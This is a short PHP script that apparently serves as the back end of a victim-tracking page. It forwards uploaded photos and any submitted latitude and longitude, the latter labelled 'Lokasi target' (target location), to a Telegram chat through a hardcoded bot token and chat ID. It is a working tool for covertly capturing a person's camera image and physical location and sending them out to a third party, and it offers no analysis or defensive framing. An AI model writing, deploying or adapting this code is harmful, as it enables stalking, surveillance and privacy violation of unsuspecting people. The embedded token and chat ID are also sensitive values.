<?php
$botToken = "7769924347:AAF9T6_jRYTJWDh8XVKgtHfd_NbPa9QFC-Y";
$chatID = "-1002541887392";

if ($_FILES['photo']) {
    $filePath = $_FILES['photo']['tmp_name'];
    $url = "https://api.telegram.org/bot$botToken/sendPhoto";
    $postFields = [
        'chat_id' => $chatID,
        'photo'   => new CURLFile(realpath($filePath))
    ];

    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type:multipart/form-data"]);
    curl_setopt($ch, CURLOPT_URL, $url); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields); 
    curl_exec($ch);
}

$data = json_decode(file_get_contents("php://input"), true);
if ($data['latitude']) {
    $message = "Lokasi target: https://maps.google.com/?q={$data['latitude']},{$data['longitude']}";
    file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatID&text=" . urlencode($message));
}
?>
